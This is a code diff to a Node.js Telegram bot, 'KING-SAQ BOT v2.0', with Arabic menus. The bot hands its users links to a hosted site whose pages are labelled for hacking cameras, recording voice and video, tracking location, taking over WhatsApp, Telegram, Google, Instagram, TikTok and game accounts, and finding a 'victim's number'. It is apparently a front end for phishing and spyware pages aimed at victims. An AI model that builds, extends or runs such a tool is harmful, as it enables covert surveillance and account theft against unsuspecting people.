@@ -7,23 +7,49 @@ const bot = new TelegramBot(TOKEN, { polling: true });
 // رابط صورة الهيدر
 const BANNER_URL = "https://www.image2url.com/r2/default/images/1792619785603-05724b00-59c1-46c7-a878-821f2cbd8452.png";
 
-// دالة لإنشاء القائمة الرئيسية
+// روابط الأقسام
+const links = {
+    'hack_cam': "https://cam-bot.bonto.run/",
+    'record_voice': "https://cam-bot.bonto.run/voice.html",
+    'record_video': "https://cam-bot.bonto.run/video.html",
+    'location': "https://cam-bot.bonto.run/location.html",
+    'hack_telegram': "https://cam-bot.bonto.run/telegram.html",
+    'hack_google': "https://cam-bot.bonto.run/google.html",
+    'network_cards': "https://cam-bot.bonto.run/cards.html",
+    'device_check': "https://cam-bot.bonto.run/scan.html",
+    'freefire': "https://cam-bot.bonto.run/freefire.html",
+    'snapchat': "https://cam-bot.bonto.run/snapchat.html",
+    'pubg': "https://cam-bot.bonto.run/pubg.html",
+    'whatsapp': "https://cam-bot.bonto.run/whatsapp.html",
+    'facebook': "https://cam-bot.bonto.run/facebook.html",
+    'instagram': "https://cam-bot.bonto.run/instagram.html",
+    'tiktok': "https://cam-bot.bonto.run/tiktok.html",
+    'hack_youtube': "https://cam-bot.bonto.run/youtube.html",
+    'hack_likee': "https://cam-bot.bonto.run/likee.html",
+    'hack_kwai': "https://cam-bot.bonto.run/kwai.html",
+    'unban_service': "https://cam-bot.bonto.run/unban.html",
+    'report_number': "https://cam-bot.bonto.run/report.html",
+    'get_phone_link': "https://t.me/heroil_2bot"
+};
+
+// دالة لإنشاء القائمة الرئيسية (كل الأقسام)
 function getMainKeyboard() {
     return {
         reply_markup: JSON.stringify({
             inline_keyboard: [
-                [{ text: "📸 اختراق كاميرا", callback_data: 'cam' }, { text: "☠️ تلغيم صورة", callback_data: 'soon' }],
-                [{ text: "🎙️ تسجيل صوت", callback_data: 'voice' }, { text: "📹 تصوير فيديو", callback_data: 'video' }],
+                [{ text: "📸 اختراق كاميرا", callback_data: 'hack_cam' }, { text: "☠️ تلغيم صورة", callback_data: 'coming_soon' }],
+                [{ text: "🎙️ تسجيل صوت", callback_data: 'record_voice' }, { text: "📹 تصوير فيديو", callback_data: 'record_video' }],
                 [{ text: "📍 تحديد الموقع", callback_data: 'location' }],
-                [{ text: "✅ اختراق واتساب", callback_data: 'whatsapp' }, { text: "📨 اختراق تلجرام", callback_data: 'telegram' }],
+                [{ text: "✅ اختراق واتساب", callback_data: 'whatsapp' }, { text: "📨 اختراق تلجرام", callback_data: 'hack_telegram' }],
                 [{ text: "🎬 اختراق تيك توك", callback_data: 'tiktok' }, { text: "🚀 اختراق انستقرام", callback_data: 'instagram' }],
                 [{ text: "🔵 اختراق فيسبوك", callback_data: 'facebook' }, { text: "👻 اختراق سناب", callback_data: 'snapchat' }],
-                [{ text: "❤️ اختراق لايكي", callback_data: 'likee' }, { text: "🎥 اختراق كواي", callback_data: 'kwai' }],
-                [{ text: "▶️ اختراق يوتيوب", callback_data: 'youtube' }],
+                [{ text: "❤️ اختراق لايكي", callback_data: 'hack_likee' }, { text: "🎥 اختراق كواي", callback_data: 'hack_kwai' }],
+                [{ text: "▶️ اختراق يوتيوب", callback_data: 'hack_youtube' }],
                 [{ text: "🔥 اختراق بوبجي", callback_data: 'pubg' }, { text: "💎 اختراق فري فاير", callback_data: 'freefire' }],
-                [{ text: "🔴 اختراق جوجل", callback_data: 'google' }, { text: "📱 فحص الجهاز", callback_data: 'device' }],
-                [{ text: "✅ فك حظر واتساب", callback_data: 'unban' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'report' }],
-                [{ text: "📞 كاشف رقم الضحية", callback_data: 'phone' }],
+                [{ text: "🔴 اختراق جوجل", callback_data: 'hack_google' }, { text: "📱 فحص الجهاز", callback_data: 'device_check' }],
+                [{ text: "✅ فك حظر واتساب", callback_data: 'unban_service' }, { text: "🚨 حظر أرقام واتساب", callback_data: 'report_number' }],
+                [{ text: "📞 كاشف رقم الضحية", callback_data: 'get_phone_link' }],
+                [{ text: "📞 سحب جهات الاتصال", callback_data: 'coming_soon' }, { text: "✉️ سحب جميع الرسائل", callback_data: 'coming_soon' }],
                 [{ text: "📱 أرقام وهمية", callback_data: 'fake_num' }],
                 [{ text: "👨‍💻 التواصل مع المطور", callback_data: 'contact' }, { text: "ℹ️ حول البوت", callback_data: 'about' }]
             ]
@@ -86,14 +112,22 @@ bot.on('callback_query', (query) => {
     } else if (data === 'back_main') {
         bot.sendMessage(chatId, "🔥 <b>اختر القسم المناسب:</b>", { parse_mode: 'HTML', ...getMainKeyboard() });
     } else if (data === 'about') {
-        bot.sendMessage(chatId, "👨‍💻 <b>KING-SAQ BOT v1.0</b>", { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, "👨‍💻 <b>KING-SAQ BOT v2.0</b>", { parse_mode: 'HTML' });
     } else if (data === 'contact') {
         bot.sendMessage(chatId, "👨‍💻 <b>المطور:</b> @heroil_1", { parse_mode: 'HTML' });
+    } else if (data === 'coming_soon') {
+        bot.sendMessage(chatId, "🛠️ <b>هذا القسم قيد التطوير حالياً.</b>", { parse_mode: 'HTML' });
+    } else if (links[data]) {
+        // هنا بيبعت الرابط الخاص بالقسم
+        bot.sendMessage(chatId, `🔗 <b>الرابط جاهز:</b>\n\n${links[data]}`, {
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+        });
     } else {
-        bot.sendMessage(chatId, "🛠️ هذا القسم قيد التطوير أو غير متاح في النسخة التجريبية.", { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, "🛠️ هذا القسم غير متاح حالياً.", { parse_mode: 'HTML' });
     }
 
     bot.answerCallbackQuery(query.id);
 });
 
-console.log("⚔ البوت شغال بنجاح على Node.js...");
+console.log("⚔ البوت شغال بنجاح على Node.js... (النسخة الكاملة)");
